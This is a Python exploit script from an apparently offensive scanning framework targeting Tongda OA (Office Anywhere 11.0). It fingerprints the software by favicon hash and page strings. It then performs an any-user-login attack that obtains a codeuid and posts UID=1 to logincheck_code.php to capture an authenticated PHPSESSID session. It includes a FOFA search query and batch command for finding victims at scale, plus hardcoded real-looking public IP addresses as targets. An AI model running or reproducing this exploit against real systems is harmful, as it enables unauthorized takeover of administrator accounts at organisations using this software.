# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 12:42

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
import re

# fofa: title="通达OA网络智能办公系统"
# python batch.py -m exploit.scripts.OA.Tongda.any_user_login -cs -fs "title=\"通达OA网络智能办公系统\""

class Script(BaseScript):
    name = 'Tongda'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.ANYUSERLOGIN
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/favicon.ico']
        # exec
        self.exec_path_list = ['/inc/expired.php', '/ispirit/login_code.php', '/logincheck_code.php']
        # 相关信息
        self.info = '''Office Anywhere 11.0版'''
        # favicon
        self.favicon_md5_list = ['ed0044587917c76d08573577c8b72883']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if text is not None and ('href="/static/images/tongda.ico"' in text or """<a href='http://www.tongda2000.com/' target='_black'>通达官网</a>""" in text or '/images/tongda.ico' in text or 'Office Anywhere' in text or '/static/templates/2013_01/index.css/' in text or 'javascript:document.form1.uname.focus()' in text or '<link rel="shortcut icon" href="/images/tongda.ico" />' in text or 'oa提示：不能登录oa' in text):
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/inc/expired.php' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/inc/expired.php'
            text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout, allow_redirects=False)
            if text is not None and 'tongda' in text:
                url = f'http://{self.target}/ispirit/login_code.php' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/ispirit/login_code.php'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout, allow_redirects=False)
                if text is not None and 'codeuid' in text:
                    headers = self.headers.copy()
                    headers.update({'Content-type': 'application/x-www-form-urlencoded'})
                    url = f'http://{self.target}/logincheck_code.php' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/logincheck_code.php'
                    re_content = re.search(r'"codeuid":"(.*?)"', text)
                    data = 'UID=1&CODEUID=_PC{}'.format(re_content.group(1))
                    async with session.post(url=url, data=data, headers=headers, timeout=self.req_timeout) as response:
                        if response is not None and response.status == 200:
                            await asyncio.sleep(2)
                            text = await response.text()
                            if '"status":1' in text:
                                re_content = re.search(r'PHPSESSID=(.*?);', response.headers.get('Set-Cookie', '')).group(1)
                                if re_content:
                                    gLogger.myscan_info('[{} {} session:{}] {}'.format(self.name, self.bug_type, re_content, url))
                                    return {'name': '{} {} session:{}'.format(self.name, self.bug_type, re_content), 'url': self.target, 'software': self.name}

if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
